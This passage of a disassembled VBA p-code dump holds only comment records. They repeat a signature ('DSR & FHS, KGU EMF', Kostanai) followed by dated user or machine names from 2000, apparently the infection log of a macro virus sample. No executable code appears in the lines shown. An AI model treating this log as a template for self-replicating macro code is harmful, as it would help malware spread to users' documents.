' Line #287:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #288:
' 	QuoteRem 0x0000 0x0000 ""
' Line #289:
' Line #290:
' Line #291:
' Line #292:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #293:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #294:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #295:
' 	QuoteRem 0x0000 0x0023 " 13:29:13 - понедельник, 3 июл 2000"
' Line #296:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #297:
' 	QuoteRem 0x0000 0x0000 ""
' Line #298:
' Line #299:
' Line #300:
' Line #301:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #302:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #303:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #304:
' 	QuoteRem 0x0000 0x0023 " 13:33:04 - понедельник, 3 июл 2000"
' Line #305:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #306:
' 	QuoteRem 0x0000 0x0000 ""
' Line #307:
' Line #308:
' Line #309:
' Line #310:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #311:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #312:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #313:
' 	QuoteRem 0x0000 0x0023 " 13:34:23 - понедельник, 3 июл 2000"
' Line #314:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #315:
' 	QuoteRem 0x0000 0x0000 ""
' Line #316:
' Line #317:
' Line #318:
' Line #319:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #320:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #321:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #322:
' 	QuoteRem 0x0000 0x0023 " 13:36:15 - понедельник, 3 июл 2000"
' Line #323:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #324:
' 	QuoteRem 0x0000 0x0000 ""
' Line #325:
' Line #326:
' Line #327:
' Line #328:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #329:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #330:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #331:
' 	QuoteRem 0x0000 0x0023 " 13:38:17 - понедельник, 3 июл 2000"
' Line #332:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #333:
' 	QuoteRem 0x0000 0x0000 ""
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #338:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #339:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #340:
' 	QuoteRem 0x0000 0x0023 " 13:39:53 - понедельник, 3 июл 2000"
' Line #341:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #342:
' 	QuoteRem 0x0000 0x0000 ""
' Line #343:
' Line #344:
' Line #345:
' Line #346:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #347:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #348:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #349:
' 	QuoteRem 0x0000 0x0023 " 13:41:33 - понедельник, 3 июл 2000"
' Line #350:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #351:
' 	QuoteRem 0x0000 0x0000 ""
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #356:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #357:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #358:
' 	QuoteRem 0x0000 0x0023 " 13:43:48 - понедельник, 3 июл 2000"
' Line #359:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #360:
' 	QuoteRem 0x0000 0x0000 ""
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #365:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #366:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #367:
' 	QuoteRem 0x0000 0x0023 " 14:48:41 - понедельник, 3 июл 2000"
' Line #368:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #369:
' 	QuoteRem 0x0000 0x0000 ""
' Line #370:
' Line #371:
' Line #372:
' Line #373:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #374:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #375:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #376:
' 	QuoteRem 0x0000 0x001D " 11:29:08 - среда, 5 июл 2000"
' Line #377:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #378:
' 	QuoteRem 0x0000 0x0000 ""
' Line #379:
' Line #380:
' Line #381:
' Line #382:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #383:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #384:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #385:
' 	QuoteRem 0x0000 0x001D " 12:11:53 - среда, 5 июл 2000"
' Line #386:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #387:
' 	QuoteRem 0x0000 0x0000 ""
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #392:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #393:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #394:
' 	QuoteRem 0x0000 0x001F " 09:51:38 - четверг, 6 июл 2000"
' Line #395:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #396:
' 	QuoteRem 0x0000 0x0000 ""
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #401:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #402:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #403:
' 	QuoteRem 0x0000 0x001F " 11:48:48 - четверг, 6 июл 2000"
' Line #404:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #405:
' 	QuoteRem 0x0000 0x0000 ""
' Line #406:
' Line #407:
' Line #408:
' Line #409:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #410:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #411:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #412:
' 	QuoteRem 0x0000 0x0024 " 11:08:05 - понедельник, 10 июл 2000"
' Line #413:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #414:
' 	QuoteRem 0x0000 0x0000 ""
' Line #415:
' Line #416:
' Line #417:
' Line #418:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #419:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #420:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #421:
' 	QuoteRem 0x0000 0x0020 " 13:04:52 - вторник, 11 июл 2000"
' Line #422:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #423:
' 	QuoteRem 0x0000 0x0000 ""
' Line #424:
' Line #425:
' Line #426:
' Line #427:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #428:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #429:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #430:
' 	QuoteRem 0x0000 0x001E " 12:05:42 - среда, 12 июл 2000"
' Line #431:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #432:
' 	QuoteRem 0x0000 0x0000 ""
' Line #433:
' Line #434:
' Line #435:
' Line #436:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #437:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #438:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #439:
' 	QuoteRem 0x0000 0x001E " 12:17:57 - среда, 12 июл 2000"
' Line #440:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #441:
' 	QuoteRem 0x0000 0x0000 ""
' Line #442:
' Line #443:
' Line #444:
' Line #445:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #446:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #447:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #448:
' 	QuoteRem 0x0000 0x001E " 12:23:51 - среда, 12 июл 2000"
' Line #449:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #450:
' 	QuoteRem 0x0000 0x0000 ""
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #455:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #456:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #457:
' 	QuoteRem 0x0000 0x001E " 14:19:43 - среда, 12 июл 2000"
' Line #458:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #459:
' 	QuoteRem 0x0000 0x0000 ""
' Line #460:
' Line #461:
' Line #462:
' Line #463:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #464:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #465:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #466:
' 	QuoteRem 0x0000 0x001E " 15:18:51 - среда, 12 июл 2000"
' Line #467:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #468:
' 	QuoteRem 0x0000 0x0000 ""
' Line #469:
' Line #470:
' Line #471:
' Line #472:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #473:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #474:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #475:
' 	QuoteRem 0x0000 0x0020 " 10:16:33 - четверг, 13 июл 2000"
' Line #476:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #477:
' 	QuoteRem 0x0000 0x0000 ""
' Line #478:
' Line #479:
' Line #480:
' Line #481:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #482:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #483:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #484:
' 	QuoteRem 0x0000 0x0020 " 10:32:54 - четверг, 13 июл 2000"
' Line #485:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #486:
' 	QuoteRem 0x0000 0x0000 ""
' Line #487:
' Line #488:
' Line #489:
' Line #490:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #491:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #492:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #493:
' 	QuoteRem 0x0000 0x0020 " 10:37:24 - четверг, 13 июл 2000"
' Line #494:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #495:
' 	QuoteRem 0x0000 0x0000 ""
' Line #496:
' Line #497:
' Line #498:
' Line #499:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #500:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #501:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #502:
' 	QuoteRem 0x0000 0x0020 " 10:48:23 - четверг, 13 июл 2000"
' Line #503:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #504:
' 	QuoteRem 0x0000 0x0000 ""
' Line #505:
' Line #506:
' Line #507:
' Line #508:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #509:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #510:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #511:
' 	QuoteRem 0x0000 0x0020 " 10:57:26 - четверг, 13 июл 2000"
' Line #512:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #513:
' 	QuoteRem 0x0000 0x0000 ""
' Line #514:
' Line #515:
' Line #516:
' Line #517:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #518:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #519:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #520:
' 	QuoteRem 0x0000 0x0020 " 11:08:28 - четверг, 13 июл 2000"
' Line #521:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #522:
' 	QuoteRem 0x0000 0x0000 ""
' Line #523:
' Line #524:
' Line #525:
' Line #526:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #527:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #528:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #529:
' 	QuoteRem 0x0000 0x0020 " 11:16:58 - четверг, 13 июл 2000"
' Line #530:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #531:
' 	QuoteRem 0x0000 0x0000 ""
' Line #532:
' Line #533:
' Line #534:
' Line #535:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #536:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #537:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #538:
' 	QuoteRem 0x0000 0x0020 " 11:38:43 - четверг, 13 июл 2000"
' Line #539:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #540:
' 	QuoteRem 0x0000 0x0000 ""
' Line #541:
' Line #542:
' Line #543:
' Line #544:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #545:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #546:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #547:
' 	QuoteRem 0x0000 0x0020 " 12:33:43 - четверг, 13 июл 2000"
' Line #548:
' 	QuoteRem 0x0000 0x000D " S. Rybalkina"
' Line #549:
' 	QuoteRem 0x0000 0x0000 ""
' Line #550:
' Line #551:
' Line #552:
' Line #553:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #554:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #555:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #556:
' 	QuoteRem 0x0000 0x0020 " 13:38:15 - пятница, 14 июл 2000"
' Line #557:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #558:
' 	QuoteRem 0x0000 0x0000 ""
' Line #559:
' Line #560:
' Line #561:
' Line #562:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #563:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #564:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #565:
' 	QuoteRem 0x0000 0x0020 " 13:53:24 - пятница, 14 июл 2000"
' Line #566:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #567:
' 	QuoteRem 0x0000 0x0000 ""
' Line #568:
' Line #569:
' Line #570:
' Line #571:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #572:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #573:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #574:
' 	QuoteRem 0x0000 0x0024 " 14:50:10 - понедельник, 17 июл 2000"
' Line #575:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #576:
' 	QuoteRem 0x0000 0x0000 ""
' Line #577:
' Line #578:
' Line #579:
' Line #580:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #581:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #582:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #583:
' 	QuoteRem 0x0000 0x0020 " 15:03:13 - вторник, 18 июл 2000"
' Line #584:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #585:
' 	QuoteRem 0x0000 0x0000 ""
' Line #586:
' Line #587:
' Line #588:
' Line #589:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #590:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #591:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #592:
' 	QuoteRem 0x0000 0x0020 " 12:53:18 - четверг, 20 июл 2000"
' Line #593:
' 	QuoteRem 0x0000 0x0008 " Apent_5"
' Line #594:
' 	QuoteRem 0x0000 0x0000 ""
' Line #595:
' Line #596:
' Line #597:
' Line #598:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #599:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #600:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #601:
' 	QuoteRem 0x0000 0x0020 " 14:07:28 - четверг, 20 июл 2000"
' Line #602:
' 	QuoteRem 0x0000 0x0008 " Apent_5"
' Line #603:
' 	QuoteRem 0x0000 0x0000 ""
' Line #604:
' Line #605:
' Line #606:
' Line #607:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #608:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #609:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #610:
' 	QuoteRem 0x0000 0x0020 " 15:11:04 - пятница, 21 июл 2000"
' Line #611:
' 	QuoteRem 0x0000 0x0006 " Users"
' Line #612:
' 	QuoteRem 0x0000 0x0005 " KGTU"
' Line #613:
' Line #614:
' Line #615:
' Line #616:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #617:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #618:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #619:
' 	QuoteRem 0x0000 0x0020 " 12:48:57 - вторник, 25 июл 2000"
' Line #620:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #621:
' 	QuoteRem 0x0000 0x0000 ""
' Line #622:
' Line #623:
' Line #624:
' Line #625:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #626:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #627:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #628:
' 	QuoteRem 0x0000 0x0020 " 16:14:48 - вторник, 25 июл 2000"
' Line #629:
' 	QuoteRem 0x0000 0x0005 " 200a"
' Line #630:
' 	QuoteRem 0x0000 0x0000 ""
' Line #631:
' Line #632:
' Line #633:
' Line #634:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #635:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #636:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #637:
' 	QuoteRem 0x0000 0x0020 " 16:56:11 - вторник, 25 июл 2000"
' Line #638:
' 	QuoteRem 0x0000 0x0005 " 200a"
' Line #639:
' 	QuoteRem 0x0000 0x0000 ""
' Line #640:
' Line #641:
' Line #642:
' Line #643:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #644:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #645:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #646:
' 	QuoteRem 0x0000 0x0024 " 11:38:40 - понедельник, 31 июл 2000"
' Line #647:
' 	QuoteRem 0x0000 0x0005 " 200a"
' Line #648:
' 	QuoteRem 0x0000 0x0000 ""
' Line #649:
' Line #650:
' Line #651:
' Line #652:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #653:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #654:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #655:
' 	QuoteRem 0x0000 0x001D " 11:05:19 - среда, 2 авг 2000"
' Line #656:
' 	QuoteRem 0x0000 0x0008 " Apent_5"
' Line #657:
' 	QuoteRem 0x0000 0x0000 ""
' Line #658:
' Line #659:
' Line #660:
' Line #661:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #662:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #663:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #664:
' 	QuoteRem 0x0000 0x001D " 11:12:34 - среда, 2 авг 2000"
' Line #665:
' 	QuoteRem 0x0000 0x0008 " Apent_5"
' Line #666:
' 	QuoteRem 0x0000 0x0000 ""
' Line #667:
' Line #668:
' Line #669:
' Line #670:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #671:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #672:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #673:
' 	QuoteRem 0x0000 0x001D " 11:13:28 - среда, 2 авг 2000"
' Line #674:
' 	QuoteRem 0x0000 0x0008 " Apent_5"
' Line #675:
' 	QuoteRem 0x0000 0x0000 ""
' Line #676:
' Line #677:
' Line #678:
' Line #679:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #680:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #681:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #682:
' 	QuoteRem 0x0000 0x0020 " 12:53:09 - пятница, 18 авг 2000"
' Line #683:
' 	QuoteRem 0x0000 0x0007 " tester"
' Line #684:
' 	QuoteRem 0x0000 0x0000 ""
' Line #685:
' Line #686:
' Line #687:
' Line #688:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #689:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #690:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #691:
' 	QuoteRem 0x0000 0x0024 " 11:20:31 - понедельник, 11 сен 2000"
' Line #692:
' 	QuoteRem 0x0000 0x0006 " Users"
' Line #693:
' 	QuoteRem 0x0000 0x0005 " KGTU"
' Line #694:
' Line #695:
' Line #696:
' Line #697:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #698:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #699:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #700:
' 	QuoteRem 0x0000 0x0020 " 13:06:08 - вторник, 12 сен 2000"
' Line #701:
' 	QuoteRem 0x0000 0x0006 " Users"
' Line #702:
' 	QuoteRem 0x0000 0x0005 " KGTU"
' Line #703:
' Line #704:
' Line #705:
' Line #706:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #707:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #708:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #709:
' 	QuoteRem 0x0000 0x0020 " 15:41:35 - вторник, 12 сен 2000"
' Line #710:
' 	QuoteRem 0x0000 0x0000 ""
' Line #711:
' 	QuoteRem 0x0000 0x0000 ""
' Line #712:
' Line #713:
' Line #714:
' Line #715:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #716:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #717:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #718:
' 	QuoteRem 0x0000 0x001E " 15:50:15 - среда, 13 сен 2000"
' Line #719:
' 	QuoteRem 0x0000 0x0000 ""
' Line #720:
' 	QuoteRem 0x0000 0x0000 ""
' Line #721:
' Line #722:
' Line #723:
' Line #724:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #725:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #726:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #727:
' 	QuoteRem 0x0000 0x0024 " 16:10:35 - понедельник, 18 сен 2000"
' Line #728:
' 	QuoteRem 0x0000 0x0000 ""
' Line #729:
' 	QuoteRem 0x0000 0x0000 ""
' Line #730:
' Line #731:
' Line #732:
' Line #733:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #734:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #735:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #736:
' 	QuoteRem 0x0000 0x0020 " 14:24:46 - вторник, 19 сен 2000"
' Line #737:
' 	QuoteRem 0x0000 0x0000 ""
' Line #738:
' 	QuoteRem 0x0000 0x0000 ""
' Line #739:
' Line #740:
' Line #741:
' Line #742:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #743:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #744:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #745:
' 	QuoteRem 0x0000 0x0020 " 14:27:51 - вторник, 19 сен 2000"
' Line #746:
' 	QuoteRem 0x0000 0x0000 ""
' Line #747:
' 	QuoteRem 0x0000 0x0000 ""
' Line #748:
' Line #749:
' Line #750:
' Line #751:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #752:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #753:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #754:
' 	QuoteRem 0x0000 0x0020 " 16:23:19 - вторник, 19 сен 2000"
' Line #755:
' 	QuoteRem 0x0000 0x0004 " ais"
' Line #756:
' 	QuoteRem 0x0000 0x0000 ""
' Line #757:
' Line #758:
' Line #759:
' Line #760:
